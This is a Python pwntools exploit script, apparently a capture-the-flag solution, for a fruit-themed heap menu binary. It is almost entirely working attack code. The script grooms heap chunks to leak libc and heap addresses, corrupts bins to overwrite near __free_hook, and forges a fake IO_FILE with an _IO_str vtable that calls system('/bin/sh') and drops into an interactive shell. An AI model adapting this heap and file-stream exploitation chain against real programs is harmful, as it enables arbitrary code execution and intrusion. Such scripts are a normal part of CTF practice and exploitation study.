#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	lg("p.pid")
	input()
	pass

def fruit(size):
	if (size==0xdd0): return b"Apple"
	elif (size==0xcb0): return b"Banana"
	elif (size==0xe50): return b"Cherry"
	elif (size==0x110): return b"Durian"

def new(size,idx,content=b'\n'):
	p.recvuntil(b"> ")
	p.sendline(b"1")
	p.recvline()
	p.sendline(fruit(size))
	p.recvline()
	p.sendline(i2b(idx))
	p.recvline()
	p.send(content)
	
def delete(size,idx):
	p.recvuntil(b"> ")
	p.sendline(b"4")
	p.recvline()
	p.sendline(fruit(size))
	p.recvuntil(b"idx:\n\x00")
	p.sendline(i2b(idx))
	
def show(size,idx):
	p.recvuntil(b"> ")
	p.sendline(b"3")
	p.recvline()
	p.sendline(fruit(size))
	p.recvuntil(b"idx:\n\x00")
	p.sendline(i2b(idx))
	
def edit(size,idx,content):
	p.recvuntil(b"> ")
	p.sendline(b"2")
	p.recvline()
	p.sendline(fruit(size))
	p.recvline()
	p.sendline(i2b(idx))
	if (size==0xdd0):
		content = content.ljust(size, b"\x00")
		rl()
		sn(content[:0x200])
		rl()
		sn(content[0x200:0x200+0xab0])
		rl()
		sn(content[0x200+0xab0:0x200+0xab0+0x100])
		rl()
		sn(content[0x200+0xab0+0x100:])
	else:
		for i in range(1):
			p.recvline()
			p.send(content)

# new(0xe50, 0)
for i in range(5):
	new(0x110, i)
new(0xe50, 0)
for i in range(5):
	delete(0x110, i)
new(0xdd0, 0)
new(0xe50, 0)
delete(0xdd0, 0)
new(0xcb0, 0)
new(0xdd0, 1)
new(0xe50, 1)
delete(0xdd0, 1)
new(0xcb0, 1)

new(0xdd0, 2)
new(0xe50, 2)
new(0xcb0, 2)
delete(0xdd0, 2)
new(0xe50, 2)
show(0xdd0, 2)
ru(b"Content is")
leak = uu64(rn(8))
lg("leak")
libc_base = leak - 0x1ed1e0
leak = uu64(rn(8))
lg("leak")
leak = uu64(rn(8))
lg("leak")
heap_base = leak - 0x4f10
leak = uu64(rn(8))
lg("leak")
lg("libc_base")
lg("heap_base")
edit(0xdd0, 2, p64(libc_base+0x1ed1e0)*2 + p64(heap_base + 0x4f10) + p64(libc_base+l.symbols['__free_hook']-0x28))
delete(0xcb0, 2)
new(0xe50, 2)

edit(0xdd0, 2, p64(heap_base+0x6b50) + p64(0x1ed1e0+libc_base) + p64(heap_base+0x6b50)*2)
edit(0xcb0, 2, p64(libc_base+0x1ed1e0) + p64(0x4f10+heap_base)*3)

new(0xdd0, 2)
new(0xe50, 2)
new(0xcb0, 2)
delete(0xdd0, 2)
new(0xe50, 2)
edit(0xdd0, 2, p64(libc_base+0x1ed1e0)*2 + p64(heap_base + 0x4f10) + p64(libc_base+0x1ed5a0-0x20))
delete(0xcb0, 2)
new(0xe50, 2)

edit(0xdd0, 1, ((p64(libc_base+0x1ed1e0)*2)+p64(heap_base + 0x4f10)*2).ljust(0xcb8, b'\x00') + p64(0x121) + p64(heap_base+0x2350)+p64(libc_base+l.symbols['__free_hook']-0x20))
new(0x110, 0)

IO_str_vtable = libc_base+0x1e9560
system_addr = libc_base+l.symbols['system']
fake_IO_FILE = 2*p64(0)
fake_IO_FILE += p64(1)
fake_IO_FILE += p64(0xffffffffffff)
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(heap_base+0x6c30)
fake_IO_FILE += p64(heap_base+0x6c30+0x58)
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(0)
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(IO_str_vtable)
payload = fake_IO_FILE + b'/bin/sh\x00' + 2*p64(system_addr)


edit(0xcb0, 2, payload)
p.recvuntil(b"> ")
sl(b"quit")

debugPID()
irt()
